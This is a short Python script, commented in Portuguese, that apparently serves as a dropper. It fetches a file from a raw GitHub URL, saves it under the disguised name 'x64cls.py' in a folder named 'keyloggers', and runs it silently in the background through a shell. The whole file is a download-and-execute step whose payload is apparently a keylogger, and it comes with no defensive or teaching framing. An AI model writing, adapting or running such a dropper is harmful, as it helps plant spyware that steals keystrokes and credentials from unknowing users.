import os
import requests
import subprocess

def download_file(url, destination):
    """Baixa um arquivo da URL fornecida e salva no destino especificado."""
    response = requests.get(url)
    with open(destination, 'wb') as file:
        file.write(response.content)

def execute_file_in_background(filepath):
    """Executa o arquivo em segundo plano no sistema."""
    subprocess.Popen(filepath, shell=True)

# URL do arquivo que você deseja baixar
url = "https://raw.githubusercontent.com/Amilt0n/teste/master/system.py"

# Diretório e nome do arquivo onde você deseja salvar
destination = "D:\\keyloggers\\teste\\x64cls.py"

# Baixe o arquivo
download_file(url, destination)
print(f"Arquivo baixado para: {destination}")

# Execute o arquivo em segundo plano
execute_file_in_background(destination)
